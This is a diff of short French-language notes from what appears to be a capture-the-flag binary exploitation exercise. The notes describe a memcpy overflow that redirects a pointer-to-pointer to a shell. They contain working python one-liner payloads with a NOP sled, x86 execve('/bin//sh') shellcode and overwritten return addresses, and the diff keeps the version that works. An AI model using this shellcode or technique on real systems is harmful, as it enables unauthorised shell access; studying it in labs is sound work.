@@ -108,8 +108,6 @@ memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 200)
         return **eax_1(eax_1, eax);
 Le return a la fin est le resultat de de la fonction operation +
 Trouver un moyen de rediriger le pointeur dans un shell code using memcpy ?
-On peut rediriger l adresse avec un overflow sur le memcpy qui va du coup overflow sur la prochaine variable. Du coup mettre l adresse d un shell code sur la prochaine variable ?
-run $(python -c 'print "\x90" * 25 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x43" * 58 + "\x70\xa0\x04\x08"')
-This works i have segfault \x43\x43\x43\x43
+On peut rediriger l adresse avec un overflow sur le memcpy qui va du coup overflow sur la prochaine variable. Du coup mettre l adresse d un shell code sur la prochaine variable ? Oui car c est un pointeur sur un pointeur donc:
 $(python -c 'print "\x90\x90\x90\x90" + "\x24\xa0\x04\x08" + "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x43" * 58 + "\x10\xa0\x04\x08"')
 This works because it’s calling 0x0804a010 who is calling 0x0804a024 who has the shell code.
